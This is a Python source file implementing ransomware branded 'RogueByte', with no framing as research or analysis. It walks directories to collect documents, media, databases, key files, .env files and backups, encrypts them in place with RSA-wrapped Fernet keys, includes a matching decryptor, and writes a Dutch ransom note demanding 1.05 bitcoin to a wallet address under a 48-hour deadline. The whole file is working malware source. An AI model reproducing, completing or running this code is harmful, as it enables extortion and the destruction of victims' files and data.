import os
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

ROGUEBYTE_HEADER = b"RogueByte"
TARGET_EXTENSIONS = (
    '.txt', '.pdf', '.odt', '.docx', '.doc', '.xls', '.xlsx',
    '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.raw', '.psd',
    '.mp4', '.mov', '.avi', '.mkv',
    '.zip', '.rar', '.7z', '.tar', '.gz',
    '.sqlite', '.db', '.sql',
    '.pem', '.key',
    '.py', '.js', '.json', '.env',
    '.bak', '.backup',
)


def find_target_files(target_dirs: list) -> list:
    found = []
    for root_dir in target_dirs:
        try:
            for dirpath, _dirs, files in os.walk(root_dir):
                for filename in files:
                    fname = os.path.join(dirpath, filename)
                    if fname.lower().endswith(TARGET_EXTENSIONS):
                        found.append(fname)
        except Exception:
            pass
    return found


def encrypt_file(file_path: str, public_key_pem: str) -> bool:
    session_key = Fernet.generate_key()
    public_key = RSA.import_key(public_key_pem)
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_session_key = cipher_rsa.encrypt(session_key)
    key_len = len(encrypted_session_key).to_bytes(2, 'big')
    crypto = Fernet(session_key)

    try:
        with open(file_path, 'rb') as f:
            content = f.read()

        encrypted_content = crypto.encrypt(content)

        with open(file_path, 'wb') as f:
            f.write(
                ROGUEBYTE_HEADER
                + key_len
                + encrypted_session_key
                + encrypted_content
            )
        return True
    except Exception as e:
        return False


def decrypt_file(file_path: str, private_key_pem: str = None) -> bool:
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
    except Exception:
        return False

    if not data.startswith(ROGUEBYTE_HEADER):
        return False

    header_len = len(ROGUEBYTE_HEADER)
    key_len = int.from_bytes(data[header_len:header_len + 2], 'big')
    encrypted_session_key = data[header_len + 2:header_len + 2 + key_len]
    encrypted_data = data[header_len + 2 + key_len:]

    try:
        private_key = RSA.import_key(private_key_pem)
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(encrypted_session_key)
        crypto = Fernet(session_key)
        decrypted_content = crypto.decrypt(encrypted_data)

        with open(file_path, 'wb') as f:
            f.write(decrypted_content)
        return True
    except Exception as e:
        return False


def count_encrypted_files(file_list: list) -> int:
    count = 0
    for f in file_list:
        try:
            with open(f, 'rb') as fp:
                if fp.read(len(ROGUEBYTE_HEADER)) == ROGUEBYTE_HEADER:
                    count += 1
        except Exception:
            pass
    return count


def write_ransom_note():
    with open("README.txt", "w") as f:
        f.write(
            "Hallo! Je hebt encryptiesoftware geactiveerd!\n"
            "Om je bestanden te decrypten moet je 1.05 bitcoin overmaken naar "
            "bc1q7x9k0m3v5d8r2p4s6nqj9l8f0wz5c2e7a4y.\n"
            "Dan zal je de decryptkey ontvangen!\n"
            "Bekijk op deze link: https://bitcoin.nl/gids/startersgids "
            "hoe je bitcoin kan kopen en overmaken.\n"
            "Bij eventuele vragen kunt u contact opnemen met onze helpdesk "
            "op: +7 912 345-67-89\n"
            "Wees u ervan bewust dat zonder onze decryptkey AL UW BESTANDEN "
            "verloren zullen gaan.\n"
            "We adviseren u dan ook zo snel mogelijk te betalen, als u "
            "binnen 48 uur betaalt zullen wij een gratis advies om dit "
            "soort aanvallen te voorkomen geven."
        )


def write_decrypt_sentinel():
    with open(".decrypt.txt", "w") as f:
        f.write(
            "b8cdef42e552ca7389708a4e3001510b9ca22a5a2a78be9dcc51d50f73"
            "e4d25b32b44d103c681d26efdf391f11878035e2cafbeb49629aab0d87"
            "02a9d228a12b"
        )
